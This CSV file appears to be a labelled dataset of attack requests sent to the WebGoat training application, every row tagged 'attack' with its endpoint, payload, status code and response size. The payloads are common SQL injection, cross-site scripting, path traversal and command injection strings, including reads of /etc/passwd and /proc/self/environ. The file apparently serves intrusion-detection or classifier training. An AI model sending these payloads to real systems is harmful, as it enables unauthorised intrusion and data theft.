source_app,label,method,path,body,status_code,response_size
webgoat,attack,POST,cia/command-injection,payload=../../../../etc/passwd&nonce=70b7b4f8,404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=../../../../etc/passwd&nonce=74e506ce,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=a66066d5 <img src=x onerror=alert(1)>,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=991009c8 $(id),200,279
webgoat,attack,POST,cia/command-injection,payload=<svg/onload=alert(1)>&nonce=8fa6a0a4,404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=..\..\..\windows\win.ini -- 164d1fbe,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=085a2a0c ' OR '1'='1,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=7fca5c0a ..\..\..\windows\win.ini,200,279
webgoat,attack,POST,service/restxml,payload=$(id)&nonce=c1af72ac,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=336183fc ' OR 1=1#,200,279
webgoat,attack,POST,service/restxml,payload=9511691e ; cat /etc/passwd,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=/proc/self/environ -- eb9d0aa4,200,279
webgoat,attack,POST,service/restxml,payload=bf8a1549 /proc/self/environ,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=c1391cd2 | dir,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<svg/onload=alert(1)> -- 975b81e0,200,279
webgoat,attack,POST,cia/command-injection,payload=0ce1611f | dir,404,14753
webgoat,attack,POST,cia/command-injection,payload=../../../../etc/passwd&nonce=38c0cf35,404,14753
webgoat,attack,POST,cia/command-injection,payload=javascript:alert(1) -- 935b7fe4,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=<svg/onload=alert(1)>&nonce=7535592d,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=829b8e24 ' OR 1=1#,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=502f296e && whoami,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=8e7f0fe9 `ping 127.0.0.1`,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=javascript:alert(1)&nonce=f767fc5e,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=..\..\..\windows\win.ini&nonce=c0734770,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=admin' -- -- 82456045,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=' OR '1'='1&nonce=4af6f7c9,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=1; DROP TABLE users&nonce=05df1a9b,400,15972
webgoat,attack,POST,service/restxml,payload=12766aa0 $(id),404,14741
webgoat,attack,POST,cia/command-injection,payload=6881566a <img src=x onerror=alert(1)>,404,14753
webgoat,attack,POST,service/restxml,payload=ffb26e10 /proc/self/environ,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=javascript:alert(1)&nonce=11a0a719,400,15972
webgoat,attack,POST,service/restxml,payload=70eff157 $(id),404,14741
webgoat,attack,POST,service/restxml,payload=/proc/self/environ&nonce=1e8e3cfd,404,14741
webgoat,attack,POST,service/restxml,payload=`ping 127.0.0.1`&nonce=9296fe54,404,14741
webgoat,attack,POST,service/restxml,payload=../../../../etc/passwd&nonce=7f8a1ee7,404,14741
webgoat,attack,POST,cia/command-injection,payload=| dir&nonce=379fdfb2,404,14753
webgoat,attack,POST,cia/command-injection,payload=&& whoami&nonce=d4ad58cd,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=../../../../etc/passwd&nonce=47c61414,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=d4d3e637 ..\..\..\windows\win.ini,400,15972
webgoat,attack,POST,service/restxml,payload=admin' -- -- f38aec1d,404,14741
webgoat,attack,POST,cia/command-injection,payload=<script>alert('XSS')</script> -- 4d961e9d,404,14753
webgoat,attack,POST,cia/command-injection,payload=<script>alert('XSS')</script>&nonce=363c409e,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=| dir&nonce=d8eeafbc,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<svg/onload=alert(1)>&nonce=85de6506,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=../../../../etc/passwd&nonce=d7bde857,200,279
webgoat,attack,POST,service/restxml,payload=' OR 1=1# -- 2fd4f4dc,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=..\..\..\windows\win.ini&nonce=5a7ee10d,400,15972
webgoat,attack,POST,service/restxml,payload=/proc/self/environ -- 0ff37bab,404,14741
webgoat,attack,POST,service/restxml,payload=WAITFOR DELAY '0:0:5' -- 6171aa41,404,14741
webgoat,attack,POST,cia/command-injection,payload=| dir -- c9bc8d69,404,14753
webgoat,attack,POST,service/restxml,payload=' OR 1=1#&nonce=b03ad6d9,404,14741
webgoat,attack,POST,cia/command-injection,payload=1; DROP TABLE users&nonce=9fb9be1c,404,14753
webgoat,attack,POST,service/restxml,payload=<script>alert('XSS')</script> -- aef1a971,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<svg/onload=alert(1)>&nonce=03ed96d4,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=b4695e49 ..\..\..\windows\win.ini,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=../../../../etc/passwd&nonce=cb502e3e,400,15972
webgoat,attack,POST,service/restxml,"payload=UNION SELECT NULL, NULL&nonce=358b6d39",404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,"payload=2e017fb1 '""><script>alert(1)</script>",200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=| dir&nonce=b28a09f6,200,279
webgoat,attack,POST,cia/command-injection,payload=b9ae0a97 <script>alert('XSS')</script>,404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=../../../../etc/passwd&nonce=85931c42,200,279
webgoat,attack,POST,cia/command-injection,payload=admin' --&nonce=1a38d64f,404,14753
webgoat,attack,POST,cia/command-injection,payload=/proc/self/environ&nonce=7c7146f5,404,14753
webgoat,attack,POST,cia/command-injection,payload=a775b7ab 1; DROP TABLE users,404,14753
webgoat,attack,POST,service/restxml,payload=9ad20379 1; DROP TABLE users,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=a31756c1 javascript:alert(1),400,15972
webgoat,attack,POST,service/restxml,payload=/proc/self/environ -- b711e3b0,404,14741
webgoat,attack,POST,service/restxml,payload=' OR '1'='1 -- 04b85c66,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=' OR 1=1#&nonce=f38c6990,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=069fd977 ..\..\..\windows\win.ini,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=| dir&nonce=238b5ec2,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=62fe6d86 ../../../../etc/passwd,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=1; DROP TABLE users&nonce=2e7d988e,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=..\..\..\windows\win.ini -- 8d422ca0,200,279
webgoat,attack,POST,service/restxml,"payload=a28212df '""><script>alert(1)</script>",404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=admin' --&nonce=410a1f93,200,279
webgoat,attack,POST,service/restxml,payload=<img src=x onerror=alert(1)>&nonce=4c9148da,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=`ping 127.0.0.1`&nonce=75f34cdb,200,279
webgoat,attack,POST,SqlInjection/attack8,"payload='""><script>alert(1)</script>&nonce=c783d141",400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=' OR '1'='1 -- 30993cdd,400,15972
webgoat,attack,POST,service/restxml,payload=<svg/onload=alert(1)>&nonce=f5cac4b2,404,14741
webgoat,attack,POST,service/restxml,payload=javascript:alert(1) -- 2acc9da6,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=$(id) -- ed255e53,200,279
webgoat,attack,POST,cia/command-injection,payload=' OR '1'='1&nonce=85f3a02c,404,14753
webgoat,attack,POST,service/restxml,payload=<script>alert('XSS')</script> -- 172c435f,404,14741
webgoat,attack,POST,service/restxml,payload=3ea8b6cd $(id),404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=javascript:alert(1)&nonce=d1e9d994,200,279
webgoat,attack,POST,cia/command-injection,payload=' OR '1'='1 -- 879826a8,404,14753
webgoat,attack,POST,service/restxml,payload=$(id) -- 173cadfa,404,14741
webgoat,attack,POST,service/restxml,payload=b58d71a2 ' OR '1'='1,404,14741
webgoat,attack,POST,service/restxml,payload=$(id)&nonce=70fa4840,404,14741
webgoat,attack,POST,service/restxml,payload=| dir&nonce=7ca2928d,404,14741
webgoat,attack,POST,cia/command-injection,payload=f9a4884d ' OR 1=1#,404,14753
webgoat,attack,POST,cia/command-injection,payload=' OR 1=1# -- 10c8bc42,404,14753
webgoat,attack,POST,service/restxml,payload=0b128efa admin' --,404,14741
webgoat,attack,POST,service/restxml,"payload=12624795 UNION SELECT NULL, NULL",404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=..\..\..\windows\win.ini&nonce=993357a1,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=<svg/onload=alert(1)> -- d76ca941,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=$(id) -- 12e444ba,200,279
webgoat,attack,POST,SqlInjection/attack8,"payload=9644bbf6 '""><script>alert(1)</script>",400,15972
webgoat,attack,POST,cia/command-injection,payload=WAITFOR DELAY '0:0:5' -- 464edf2d,404,14753
webgoat,attack,POST,cia/command-injection,payload=cec39a13 /proc/self/environ,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=admin' -- -- 406d635f,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=638b8b3c `ping 127.0.0.1`,400,15972
webgoat,attack,POST,cia/command-injection,payload=<script>alert('XSS')</script> -- 05afbbd3,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=..\..\..\windows\win.ini -- a90fb3fa,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=b4e98cb2 <script>alert('XSS')</script>,200,279
webgoat,attack,POST,service/restxml,payload=<svg/onload=alert(1)>&nonce=fb20c4bb,404,14741
webgoat,attack,POST,SqlInjection/attack8,"payload=fb875b2a UNION SELECT NULL, NULL",400,15972
webgoat,attack,POST,cia/command-injection,payload=; cat /etc/passwd&nonce=372eda08,404,14753
webgoat,attack,POST,cia/command-injection,payload=77195a3b && whoami,404,14753
webgoat,attack,POST,cia/command-injection,payload=admin' -- -- db4b39cc,404,14753
webgoat,attack,POST,service/restxml,payload=..\..\..\windows\win.ini&nonce=b8840532,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=..\..\..\windows\win.ini -- 0f57ea51,400,15972
webgoat,attack,POST,cia/command-injection,"payload=45116cec UNION SELECT NULL, NULL",404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=..\..\..\windows\win.ini&nonce=5d038261,400,15972
webgoat,attack,POST,SqlInjection/attack8,"payload=52b9243a '""><script>alert(1)</script>",400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=javascript:alert(1) -- 6646b2c1,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=1; DROP TABLE users&nonce=26c74778,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=; cat /etc/passwd -- 7f3b473f,200,279
webgoat,attack,POST,service/restxml,payload=..\..\..\windows\win.ini&nonce=300e1471,404,14741
webgoat,attack,POST,cia/command-injection,payload=34d9f455 && whoami,404,14753
webgoat,attack,POST,service/restxml,payload=dc7012b0 $(id),404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=bc29242d WAITFOR DELAY '0:0:5',200,279
webgoat,attack,POST,SqlInjection/attack8,payload=..\..\..\windows\win.ini&nonce=2de8c9bd,400,15972
webgoat,attack,POST,service/restxml,payload=&& whoami -- af76b5ba,404,14741
webgoat,attack,POST,service/restxml,payload=../../../../etc/passwd -- aa0a5d13,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=/proc/self/environ -- b07cb8b1,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=`ping 127.0.0.1` -- be49b7fd,400,15972
webgoat,attack,POST,cia/command-injection,payload=; cat /etc/passwd&nonce=3fc576fb,404,14753
webgoat,attack,POST,service/restxml,payload=../../../../etc/passwd -- 48ed69e9,404,14741
webgoat,attack,POST,service/restxml,payload=e67f1d61 javascript:alert(1),404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=$(id) -- 79a65a21,400,15972
webgoat,attack,POST,service/restxml,payload=../../../../etc/passwd&nonce=c77d1b79,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=../../../../etc/passwd&nonce=2f9f9b1f,400,15972
webgoat,attack,POST,service/restxml,payload=<img src=x onerror=alert(1)>&nonce=9958c7a7,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=| dir&nonce=e41a5d18,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<svg/onload=alert(1)> -- 6dbd107d,200,279
webgoat,attack,POST,service/restxml,payload=<svg/onload=alert(1)>&nonce=ee0ded25,404,14741
webgoat,attack,POST,service/restxml,payload=67db49a7 <script>alert('XSS')</script>,404,14741
webgoat,attack,POST,service/restxml,payload=a67d9d3e ; cat /etc/passwd,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=..\..\..\windows\win.ini -- b6e2b854,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<script>alert('XSS')</script> -- 3ce5d390,200,279
webgoat,attack,POST,SqlInjection/attack8,"payload=UNION SELECT NULL, NULL -- a17145e8",400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=' OR 1=1# -- fbf90537,200,279
webgoat,attack,POST,service/restxml,payload=&& whoami -- 005841ac,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=fc9cd700 ' OR 1=1#,200,279
webgoat,attack,POST,service/restxml,payload=WAITFOR DELAY '0:0:5'&nonce=20de3246,404,14741
webgoat,attack,POST,cia/command-injection,payload=461318f9 ' OR 1=1#,404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=/proc/self/environ&nonce=739aca05,200,279
webgoat,attack,POST,service/restxml,payload=00d4df7d 1; DROP TABLE users,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=/proc/self/environ&nonce=c1b75aed,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=admin' -- -- ff269743,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=193352e6 && whoami,200,279
webgoat,attack,POST,service/restxml,payload=| dir&nonce=9eb3e2a2,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=55954d6b ../../../../etc/passwd,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,"payload=7be61c2f '""><script>alert(1)</script>",200,279
webgoat,attack,POST,SqlInjection/attack8,payload=| dir&nonce=89587013,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<svg/onload=alert(1)>&nonce=9e022d02,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<img src=x onerror=alert(1)>&nonce=6432c38e,200,279
webgoat,attack,POST,cia/command-injection,"payload=UNION SELECT NULL, NULL -- dedf5ade",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=a1c61ab6 ../../../../etc/passwd,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=&& whoami -- fc590354,400,15972
webgoat,attack,POST,service/restxml,payload=`ping 127.0.0.1` -- c6d272d4,404,14741
webgoat,attack,POST,cia/command-injection,payload=../../../../etc/passwd&nonce=343d4170,404,14753
webgoat,attack,POST,cia/command-injection,payload=cd3a9020 javascript:alert(1),404,14753
webgoat,attack,POST,service/restxml,payload=/proc/self/environ -- 07d833fb,404,14741
webgoat,attack,POST,service/restxml,payload=952825f6 `ping 127.0.0.1`,404,14741
webgoat,attack,POST,service/restxml,"payload=UNION SELECT NULL, NULL -- 7673fb22",404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=' OR 1=1# -- 29d95f7d,400,15972
webgoat,attack,POST,SqlInjection/attack8,"payload='""><script>alert(1)</script> -- 13b7fa76",400,15972
webgoat,attack,POST,service/restxml,payload=| dir&nonce=958c8fe7,404,14741
webgoat,attack,POST,service/restxml,payload=1; DROP TABLE users -- bd7c5b1b,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=../../../../etc/passwd -- 9f0c4475,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=1bd852b3 ' OR 1=1#,200,279
webgoat,attack,POST,cia/command-injection,payload=$(id)&nonce=4b2b3b9d,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=' OR '1'='1 -- fcef9c2b,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=`ping 127.0.0.1` -- 56738a34,400,15972
webgoat,attack,POST,service/restxml,payload=b982bc14 admin' --,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=' OR 1=1# -- 26e5542c,400,15972
webgoat,attack,POST,service/restxml,"payload=UNION SELECT NULL, NULL&nonce=c761df68",404,14741
webgoat,attack,POST,cia/command-injection,payload=' OR '1'='1&nonce=f950f322,404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=' OR 1=1# -- 0248fe2e,200,279
webgoat,attack,POST,cia/command-injection,payload=fcc8ad6d $(id),404,14753
webgoat,attack,POST,cia/command-injection,payload=..\..\..\windows\win.ini -- 8701c343,404,14753
webgoat,attack,POST,cia/command-injection,payload=2ed44e91 ; cat /etc/passwd,404,14753
webgoat,attack,POST,cia/command-injection,payload=/proc/self/environ&nonce=9c80eb19,404,14753
webgoat,attack,POST,service/restxml,payload=javascript:alert(1) -- faa642fd,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=javascript:alert(1) -- 23674814,400,15972
webgoat,attack,POST,service/restxml,payload=..\..\..\windows\win.ini -- d5818398,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=`ping 127.0.0.1` -- 851052d8,200,279
webgoat,attack,POST,cia/command-injection,payload=8247eee5 admin' --,404,14753
webgoat,attack,POST,service/restxml,payload=$(id)&nonce=d660b22c,404,14741
webgoat,attack,POST,service/restxml,payload=WAITFOR DELAY '0:0:5'&nonce=3b7e707b,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=16b30fd9 | dir,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=/proc/self/environ&nonce=9b936731,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=; cat /etc/passwd&nonce=027b13d1,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,"payload=f1267183 UNION SELECT NULL, NULL",200,279
webgoat,attack,POST,cia/command-injection,payload=&& whoami&nonce=1caa1321,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=../../../../etc/passwd&nonce=b02f24ef,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=`ping 127.0.0.1`&nonce=f84cb502,200,279
webgoat,attack,POST,cia/command-injection,payload=208ba155 javascript:alert(1),404,14753
webgoat,attack,POST,cia/command-injection,payload=| dir&nonce=59df260f,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=dac680f0 | dir,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=WAITFOR DELAY '0:0:5'&nonce=12679854,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=83f2d4be <img src=x onerror=alert(1)>,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,"payload=1312b2d6 UNION SELECT NULL, NULL",200,279
webgoat,attack,POST,service/restxml,payload=e5041889 ../../../../etc/passwd,404,14741
webgoat,attack,POST,cia/command-injection,payload=68ff0877 ..\..\..\windows\win.ini,404,14753
webgoat,attack,POST,service/restxml,payload=e21fe158 <img src=x onerror=alert(1)>,404,14741
webgoat,attack,POST,service/restxml,payload=259754c6 ../../../../etc/passwd,404,14741
webgoat,attack,POST,service/restxml,payload=f061f6bb ..\..\..\windows\win.ini,404,14741
webgoat,attack,POST,service/restxml,"payload=UNION SELECT NULL, NULL -- 31fa90d5",404,14741
webgoat,attack,POST,cia/command-injection,payload=..\..\..\windows\win.ini -- b4fe4393,404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,payload=; cat /etc/passwd&nonce=3fdbb6f7,200,279
webgoat,attack,POST,service/restxml,payload=' OR 1=1# -- cb4c19ba,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=..\..\..\windows\win.ini&nonce=53d79e42,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,"payload=4282ea4c '""><script>alert(1)</script>",200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<svg/onload=alert(1)>&nonce=8f1d1e1e,200,279
webgoat,attack,POST,cia/command-injection,payload=`ping 127.0.0.1`&nonce=736398ea,404,14753
webgoat,attack,POST,cia/command-injection,payload=91d20583 1; DROP TABLE users,404,14753
webgoat,attack,POST,service/restxml,payload=..\..\..\windows\win.ini -- a73bdc86,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=../../../../etc/passwd&nonce=f59c5a9e,200,279
webgoat,attack,POST,service/restxml,payload=cb6e1ae5 ../../../../etc/passwd,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=f17809ef <img src=x onerror=alert(1)>,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=WAITFOR DELAY '0:0:5' -- 7fe92d3b,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=; cat /etc/passwd&nonce=bb42ed89,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=| dir -- 462796b3,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=&& whoami&nonce=ec4beb58,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=WAITFOR DELAY '0:0:5'&nonce=172763b0,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=85bf559e $(id),200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=/proc/self/environ -- f1cc9625,200,279
webgoat,attack,POST,service/restxml,"payload='""><script>alert(1)</script> -- 4a5e7193",404,14741
webgoat,attack,POST,cia/command-injection,payload=/proc/self/environ&nonce=1850d0a8,404,14753
webgoat,attack,POST,service/restxml,"payload=UNION SELECT NULL, NULL&nonce=a512416f",404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=<script>alert('XSS')</script> -- 153d5cc2,200,279
webgoat,attack,POST,cia/command-injection,payload=' OR '1'='1&nonce=6995efc9,404,14753
webgoat,attack,POST,service/restxml,"payload=UNION SELECT NULL, NULL -- dea70acd",404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=de6c28c4 | dir,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=/proc/self/environ&nonce=b4c28a40,400,15972
webgoat,attack,POST,service/restxml,payload=fb9b2bea | dir,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=<svg/onload=alert(1)> -- 4e28e65a,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=&& whoami&nonce=4a5fd270,200,279
webgoat,attack,POST,service/restxml,payload=WAITFOR DELAY '0:0:5' -- 4f817668,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=admin' --&nonce=90859b73,400,15972
webgoat,attack,POST,service/restxml,payload=..\..\..\windows\win.ini -- 9b0a7263,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=admin' --&nonce=749edd0f,200,279
webgoat,attack,POST,cia/command-injection,payload=50eafa3e ..\..\..\windows\win.ini,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=e30e08ba | dir,400,15972
webgoat,attack,POST,cia/command-injection,payload=..\..\..\windows\win.ini&nonce=148789c5,404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,"payload=b3e166cb UNION SELECT NULL, NULL",200,279
webgoat,attack,POST,CrossSiteScripting/attack1,payload=javascript:alert(1)&nonce=2c857928,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=..\..\..\windows\win.ini&nonce=b6875dae,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=b3e06ba5 | dir,400,15972
webgoat,attack,POST,cia/command-injection,payload=javascript:alert(1)&nonce=13108af3,404,14753
webgoat,attack,POST,service/restxml,payload=..\..\..\windows\win.ini -- e291a4b5,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=| dir&nonce=3890aa83,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=`ping 127.0.0.1` -- c828acd8,400,15972
webgoat,attack,POST,cia/command-injection,payload=b55db207 | dir,404,14753
webgoat,attack,POST,cia/command-injection,payload=73bd9ddc WAITFOR DELAY '0:0:5',404,14753
webgoat,attack,POST,service/restxml,payload=3e78e49c ' OR '1'='1,404,14741
webgoat,attack,POST,cia/command-injection,payload=b8441d65 admin' --,404,14753
webgoat,attack,POST,service/restxml,payload=WAITFOR DELAY '0:0:5' -- cfa66238,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=041a105a <svg/onload=alert(1)>,400,15972
webgoat,attack,POST,service/restxml,payload=535a2a46 ..\..\..\windows\win.ini,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=<script>alert('XSS')</script>&nonce=c18a8288,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=; cat /etc/passwd&nonce=d01d72bd,200,279
webgoat,attack,POST,SqlInjection/attack8,payload=; cat /etc/passwd -- 5f36240c,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=4879c6c2 `ping 127.0.0.1`,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=5da6b138 ; cat /etc/passwd,400,15972
webgoat,attack,POST,service/restxml,payload=6d9b00c1 javascript:alert(1),404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=82b6cedd ../../../../etc/passwd,400,15972
webgoat,attack,POST,service/restxml,payload=cc0b24c9 ' OR '1'='1,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=javascript:alert(1) -- 19917f70,400,15972
webgoat,attack,POST,service/restxml,payload=a27600e3 <script>alert('XSS')</script>,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=/proc/self/environ -- 6f68b31c,400,15972
webgoat,attack,POST,CrossSiteScripting/attack1,payload=admin' --&nonce=6c9404fd,200,279
webgoat,attack,POST,cia/command-injection,payload=`ping 127.0.0.1` -- 12464ede,404,14753
webgoat,attack,POST,service/restxml,payload=c6f380be ; cat /etc/passwd,404,14741
webgoat,attack,POST,SqlInjection/attack8,payload=5140ac5e ' OR 1=1#,400,15972
webgoat,attack,POST,SqlInjection/attack8,payload=/proc/self/environ -- 6f2c9e8d,400,15972
webgoat,attack,POST,service/restxml,payload=| dir -- 2a4e8a08,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=javascript:alert(1)&nonce=796144d8,200,279
webgoat,attack,POST,service/restxml,payload=ad21c255 <script>alert('XSS')</script>,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,"payload=85813bdf UNION SELECT NULL, NULL",200,279
webgoat,attack,POST,SqlInjection/attack8,payload=<script>alert('XSS')</script>&nonce=af7fc445,400,15972
webgoat,attack,POST,service/restxml,payload=' OR 1=1#&nonce=8eb799a4,404,14741
webgoat,attack,POST,service/restxml,payload=`ping 127.0.0.1`&nonce=bcfcc933,404,14741
webgoat,attack,POST,CrossSiteScripting/attack1,payload=WAITFOR DELAY '0:0:5'&nonce=e73c53b7,200,279
webgoat,attack,POST,cia/command-injection,payload=../../../../etc/passwd -- bae8c8d3,404,14753
webgoat,attack,POST,SqlInjection/attack8,payload=a05b7638 <svg/onload=alert(1)>,400,15972
webgoat,attack,POST,service/restxml,payload=d496c9a2 ' OR '1'='1,404,14741
webgoat,attack,POST,service/restxml,payload=`ping 127.0.0.1` -- ddb1e54e,404,14741
